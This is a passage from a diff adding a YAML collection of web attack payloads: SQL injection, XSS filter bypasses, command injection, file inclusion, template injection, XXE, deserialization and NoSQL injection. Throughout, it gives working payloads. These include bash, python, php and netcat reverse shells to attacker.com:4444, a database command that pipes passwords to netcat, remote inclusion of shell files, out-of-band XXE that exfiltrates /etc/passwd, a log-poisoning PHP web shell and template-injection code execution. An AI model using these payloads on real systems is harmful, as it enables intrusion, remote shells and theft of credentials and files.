+            - "'; COPY (SELECT password FROM users) TO PROGRAM 'nc attacker.com 4444'--"
+            
+      advanced_union_based:
+        column_number_detection:
+          - "' ORDER BY 1--"
+          - "' ORDER BY 2--"
+          - "' UNION SELECT NULL--"
+          - "' UNION SELECT NULL,NULL--"
+          
+        data_extraction:
+          mysql:
+            - "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--"
+            - "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--"
+            - "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--"
+          postgresql:
+            - "' UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables--"
+            - "' UNION SELECT 1,array_to_string(array_agg(column_name),','),3 FROM information_schema.columns WHERE table_name='users'--"
+            
+      second_order_sqli:
+        scenario:
+          step_1: "Register with username: admin'--"
+          step_2: "Application stores in database"
+          step_3: "Admin views user list"
+          step_4: "Query: SELECT * FROM users WHERE username='admin'--'"
+          result: "SQL injection triggered in admin context"
+          
+  xss_advanced:
+    description: "Advanced XSS with modern bypass techniques"
+    
+    waf_bypass_payloads:
+      event_handler_obfuscation:
+        - "<img src=x onerror=alert(1)>"
+        - "<svg onload=alert(1)>"
+        - "<body onload=alert(1)>"
+        - "<marquee onstart=alert(1)>"
+        - "<details open ontoggle=alert(1)>"
+        
+      encoding_bypass:
+        html_entities:
+          - "&#60;script&#62;alert(1)&#60;/script&#62;"
+          - "&lt;script&gt;alert(1)&lt;/script&gt;"
+        javascript_unicode:
+          - "<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>"
+          - "<script>\\x61\\x6C\\x65\\x72\\x74(1)</script>"
+        url_encoding:
+          - "%3Cscript%3Ealert(1)%3C/script%3E"
+        mixed_encoding:
+          - "<script>\\u0061lert(1)</script>"
+          - "<%73cript>alert(1)</script>"
+          
+      filter_bypass:
+        keyword_splitting:
+          - "<scr<script>ipt>alert(1)</scr</script>ipt>"
+          - "<img src=x onerror=eval('al'+'ert(1)')>"
+        null_byte:
+          - "<script%00>alert(1)</script>"
+          - "<img src=x%00 onerror=alert(1)>"
+        newline_injection:
+          - "<img src=x%0Aonerror=alert(1)>"
+          - "<svg%0Aonload=alert(1)>"
+          
+      context_specific:
+        html_context:
+          - "<img src=x onerror=alert(document.domain)>"
+          - "<svg/onload=alert(document.cookie)>"
+          
+        attribute_context:
+          - "' onmouseover='alert(1)"
+          - '" autofocus onfocus="alert(1)"'
+          - "javascript:alert(1)"
+          
+        javascript_context:
+          - "</script><script>alert(1)</script>"
+          - "';alert(1)//"
+          - "\"-alert(1)-\""
+          
+        css_context:
+          - "</style><script>alert(1)</script>"
+          - "expression(alert(1))"
+          - "-moz-binding:url(//attacker.com/xss.xml)"
+          
+    advanced_xss_techniques:
+      dom_based_xss:
+        sources:
+          - "location.hash"
+          - "location.search"
+          - "document.referrer"
+          - "document.cookie"
+          - "window.name"
+          
+        sinks:
+          - "eval()"
+          - "innerHTML"
+          - "outerHTML"
+          - "document.write()"
+          - "location.href"
+          
+        payloads:
+          - "http://victim.com/#<img src=x onerror=alert(1)>"
+          - "http://victim.com/?q=<script>alert(1)</script>"
+          
+      mutation_xss:
+        description: "mXSS - Browser parsing quirks"
+        payloads:
+          - "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+          - "<svg><style><img src=x onerror=alert(1)></style>"
+          - "<math><mi><mglyph><style><img src=x onerror=alert(1)>"
+          
+      prototype_pollution_to_xss:
+        payload: |
+          ?__proto__[innerHTML]=<img src=x onerror=alert(1)>
+          
+  command_injection_advanced:
+    description: "OS command injection with bypasses"
+    
+    command_separators:
+      linux_unix:
+        - "; whoami"
+        - "| whoami"
+        - "|| whoami"
+        - "& whoami"
+        - "&& whoami"
+        - "`whoami`"
+        - "$(whoami)"
+        - "%0A whoami"
+        - "%0D whoami"
+        
+      windows:
+        - "& whoami"
+        - "| whoami"
+        - "|| whoami"
+        - "%0A whoami"
+        
+    bypass_techniques:
+      blacklist_bypass:
+        variable_expansion:
+          - "$IFS (Internal Field Separator)"
+          - "${IFS}"
+          - "$9 (Empty variable)"
+        character_insertion:
+          - "w'h'o'a'm'i"
+          - "w\"h\"o\"a\"m\"i"
+          - "w\\ho\\am\\i"
+        wildcards:
+          - "/???/??t /etc/passwd"
+          - "/bin/c?t /etc/passwd"
+        base_encoding:
+          - "echo d2hvYW1p | base64 -d | sh"
+          - "echo 'whoami' | base64 -d | sh"
+          
+      reverse_shell_payloads:
+        bash:
+          - "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+          - "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'"
+        python:
+          - "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+        php:
+          - "php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        netcat:
+          - "nc -e /bin/sh attacker.com 4444"
+          - "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f"
+          
+  lfi_rfi_advanced:
+    description: "Local/Remote File Inclusion exploitation"
+    
+    lfi_techniques:
+      path_traversal:
+        - "../../../../etc/passwd"
+        - "....//....//....//etc/passwd"
+        - "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+        
+      null_byte_bypass:
+        - "../../../../etc/passwd%00"
+        - "../../../../etc/passwd%00.jpg"
+        
+      encoding_bypass:
+        - "..%252f..%252f..%252fetc%252fpasswd"
+        - "..%c0%af..%c0%afetc%c0%afpasswd"
+        
+      wrapper_exploitation:
+        php_wrappers:
+          - "php://filter/convert.base64-encode/resource=index.php"
+          - "php://input (with POST data)"
+          - "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
+          - "expect://id"
+          - "zip://archive.zip#shell.php"
+          
+      log_poisoning:
+        technique:
+          step_1: "Poison log file with PHP code"
+          step_2: "Include log file via LFI"
+          step_3: "Execute injected code"
+        targets:
+          - "/var/log/apache2/access.log"
+          - "/var/log/apache2/error.log"
+          - "/var/log/nginx/access.log"
+          - "/var/log/mail.log"
+        payload: "User-Agent: <?php system($_GET['cmd']); ?>"
+        
+    rfi_techniques:
+      basic_rfi:
+        - "?file=http://attacker.com/shell.txt"
+        - "?file=http://attacker.com/shell.php"
+        
+      bypass_techniques:
+        - "?file=http://attacker.com/shell.txt?"
+        - "?file=http://attacker.com/shell.txt%00"
+        - "?file=http://attacker.com/shell.txt#"
+        
+  ssti_advanced:
+    description: "Server-Side Template Injection"
+    
+    detection_payloads:
+      universal_detection:
+        - "{{7*7}}"
+        - "${7*7}"
+        - "<%=7*7%>"
+        - "${{7*7}}"
+        - "#{7*7}"
+        
+    exploitation_by_engine:
+      jinja2_python:
+        payloads:
+          - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+          - "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()}}"
+          - "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}"
+          
+      freemarker:
+        payloads:
+          - "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\")}"
+          - "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+          
+      velocity:
+        payloads:
+          - "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
+          
+      thymeleaf:
+        payloads:
+          - "${T(java.lang.Runtime).getRuntime().exec('id')}"
+          - "__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).next()}__::.x"
+          
+  xxe_advanced:
+    description: "XML External Entity exploitation"
+    
+    basic_xxe:
+      file_disclosure:
+        payload: |
+          <?xml version="1.0"?>
+          <!DOCTYPE foo [
+            <!ELEMENT foo ANY>
+            <!ENTITY xxe SYSTEM "file:///etc/passwd">
+          ]>
+          <foo>&xxe;</foo>
+          
+    advanced_xxe:
+      out_of_band:
+        payload: |
+          <?xml version="1.0"?>
+          <!DOCTYPE foo [
+            <!ELEMENT foo ANY>
+            <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+            %xxe;
+          ]>
+          <foo>&exfil;</foo>
+          
+        evil_dtd: |
+          <!ENTITY % data SYSTEM "file:///etc/passwd">
+          <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'>">
+          %param1;
+          
+      blind_xxe:
+        payload: |
+          <?xml version="1.0"?>
+          <!DOCTYPE foo [
+            <!ELEMENT foo ANY>
+            <!ENTITY % xxe SYSTEM "http://attacker.com/log">
+            %xxe;
+          ]>
+          <foo>test</foo>
+          
+  deserialization_attacks:
+    description: "Insecure deserialization exploitation"
+    
+    java_deserialization:
+      tools:
+        - "ysoserial"
+        - "marshalsec"
+      payloads:
+        - "java -jar ysoserial.jar CommonsCollections1 'whoami' | base64"
+        - "java -jar ysoserial.jar URLDNS 'http://attacker.com/'"
+        
+    python_pickle:
+      payload: |
+        import pickle
+        import os
+        
+        class RCE:
+            def __reduce__(self):
+                return (os.system, ('id',))
+                
+        pickle.dumps(RCE())
+        
+    php_deserialization:
+      payload: |
+        O:8:"UserInfo":1:{s:8:"isAdmin";b:1;}
+        
+  nosql_injection:
+    description: "NoSQL injection attacks"
+    
+    mongodb:
+      authentication_bypass:
+        - '{"username": {"$ne": null}, "password": {"$ne": null}}'
+        - '{"username": "admin", "password": {"$regex": ".*"}}'
+        
+      operator_injection:
+        - '{"username": "admin", "password": {"$gt": ""}}'
+        - '{"age": {"$gt": 0}}'
+        
+      javascript_injection:
+        - '{"$where": "this.username == \'admin\' || \'1\'==\'1\'"}'
+        - '{"$where": "sleep(5000)"}'
 ```
 
 ---
